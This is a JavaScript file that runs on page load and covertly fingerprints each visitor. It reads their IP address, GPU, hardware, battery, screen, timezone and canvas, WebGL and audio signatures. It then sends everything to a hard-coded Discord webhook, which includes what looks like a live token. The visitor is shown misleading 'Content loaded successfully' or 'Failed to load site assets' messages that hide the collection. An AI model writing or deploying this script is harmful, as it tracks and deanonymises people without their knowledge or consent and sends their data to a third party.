// 1. Paste your regular, plain-text Discord webhook URL right here
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1515809788091699482/xmF33msGKp1azkD1Jsoe9y58Ys_ibJ49EgufQRhVJp0sJlaQN1r8Fy3ClcEZsSQJDdKn";

// This function fires automatically the exact millisecond the page loads
window.onload = async function() {
    console.log("Page loaded. Chromium automation engine active...");

    // 2. UPDATED Network Lookup (Uses api.ipify.org for maximum stability)
    let ipAddress = "Unknown";
    try {
        const ipResponse = await fetch('https://api.ipify.org');
        if (ipResponse.ok) {
            // ipify returns the IP as a direct text string, not a JSON object
            ipAddress = await ipResponse.text();
        } else {
            ipAddress = "API Server Error";
        }
    } catch (e) {
        console.log("Network fetch bypassed due to browser policy constraint.");
        ipAddress = "Fetch Constraint / Local Mode";
    }

    // 3. Gather Hardware Specifications
    const hardware = {
        cores: navigator.hardwareConcurrency || "Unknown",
        memory: navigator.deviceMemory || "Unknown"
    };

    // 4. Gather Battery Status
    let batteryInfo = "Not Supported";
    if (navigator.getBattery) {
        try {
            const bat = await navigator.getBattery();
            batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Discharging"})`;
        } catch(e){}
    }

    // 5. Gather Screen Setup and Basics
    const screenAndOs = {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenSize: `${screen.width}x${screen.height}`,
        availScreen: `${screen.availWidth}x${screen.availHeight}`,
        pixelRatio: window.devicePixelRatio,
        touchPoints: navigator.maxTouchPoints
    };

    // 6. Test Ad-Blocker Presence
    let adBlockerActive = false;
    try {
        await fetch('https://googlesyndication.com', { mode: 'no-cors' });
    } catch (e) {
        adBlockerActive = true;
    }

    // 7. Silent Canvas Calculation
    let canvasHash = "Unknown";
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200; canvas.height = 40;
        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
        ctx.fillRect(10, 10, 50, 20); ctx.fillStyle = "#069";
        ctx.fillText("Fingerprint 123 😃", 15, 12);
        canvasHash = createSimpleHash(canvas.toDataURL());
    } catch(e) {}

    // 8. Silent WebGL Hardware Query & 3D Hash
    let gpuName = "Unknown";
    let webglHash = "Unknown";
    try {
        const glCanvas = document.createElement('canvas');
        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            webglHash = createSimpleHash(glCanvas.toDataURL());
        }
    } catch(e) {}

    // 9. Silent AudioContext Core Math Query
    let audioHash = "Unknown";
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) {
            const audioCtx = new AudioContext();
            const oscillator = audioCtx.createOscillator();
            audioHash = createSimpleHash(oscillator.frequency.value.toString());
        }
    } catch(e) {}

    // 10. Scan System Fonts
    let fontsDetected = 0;
    try {
        const fontsToTest = ['Segoe UI', 'Arial', 'Calibri', 'Cambria', 'Helvetica Neue', 'Ubuntu', 'Courier New'];
        fontsToTest.forEach(font => {
            if (document.fonts && document.fonts.check(`12px "${font}"`)) {
                fontsDetected++;
            }
        });
    } catch(e) {}

    // 11. Combine EVERYTHING collected into one package
    const completeDataPayload = {
        ip: ipAddress,
        gpu: gpuName, cpuCores: hardware.cores, ram: hardware.memory, battery: batteryInfo,
        osPlatform: screenAndOs.platform, userAgent: screenAndOs.userAgent,
        screen: screenAndOs.screenSize, availableScreenSpace: screenAndOs.availScreen,
        pixelRatio: screenAndOs.pixelRatio, touchPoints: screenAndOs.touchPoints,
        timezone: screenAndOs.timezone, language: screenAndOs.language, adBlocker: adBlockerActive,
        canvasSignature: canvasHash, webglSignature: webglHash, audioSignature: audioHash,
        matchingFontsCount: fontsDetected
    };

    // Calculate Master Hash
    const masterFingerprintHash = createSimpleHash(JSON.stringify(completeDataPayload));

    // 12. Send the full payload directly to Discord
    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith("https://")) {
        sendPayloadToDiscord(DISCORD_WEBHOOK_URL, masterFingerprintHash, completeDataPayload);
    } else {
        document.getElementById('status-msg').textContent = "⚠️ Discord Webhook URL is missing at the top of main.js";
        document.getElementById('status-msg').className = "status-error";
    }
};

// Math Helper: Turns long text values into a short unique string code
function createSimpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = (hash << 5) - hash + str.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16);
}

// Discord Helper: Packages the data and sends it silently
function sendPayloadToDiscord(url, masterHash, fullData) {
    const payload = {
        embeds: [{
            title: "🕵️‍♂️ Automated Device Profile Captured",
            color: 3447003,
            fields: [
                { name: "Master Hash ID (Fingerprint)", value: `\`${masterHash}\``, inline: false },
                { name: "🌐 Network Details", value: `**IP Address:** ${fullData.ip}`, inline: false },
                { name: "💻 Hardware Core", value: `**GPU:** ${fullData.gpu}\n**CPU Cores:** ${fullData.cpuCores}\n**RAM:** ${fullData.ram} GB\n**Battery:** ${fullData.battery}`, inline: true },
                { name: "⚙️ Environment & OS Metrics", value: `**Platform:** ${fullData.osPlatform}\n**Screen:** ${fullData.screen}\n**Available Space:** ${fullData.availableScreenSpace}\n**Pixel Density:** ${fullData.pixelRatio}x\n**Touch Support:** ${fullData.touchPoints} points\n**Timezone:** ${fullData.timezone}\n**Language:** ${fullData.language}\n**Ad-Blocker Present:** ${fullData.adBlocker ? "Yes" : "No"}`, inline: false },
                { name: "🧮 Rendering Hashes", value: `**Canvas Signature:** ${fullData.canvasSignature}\n**WebGL Signature:** ${fullData.webglSignature}\n**Audio Signature:** ${fullData.audioSignature}\n**Fonts Checked:** ${fullData.matchingFontsCount} / 7`, inline: false }
            ],
            timestamp: new Date()
        }]
    };

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(() => {
        document.getElementById('status-msg').textContent = "Content loaded successfully.";
        document.getElementById('status-msg').className = "status-success";
    })
    .catch(() => {
        document.getElementById('status-msg').textContent = "Failed to load site assets.";
        document.getElementById('status-msg').className = "status-error";
    });
}
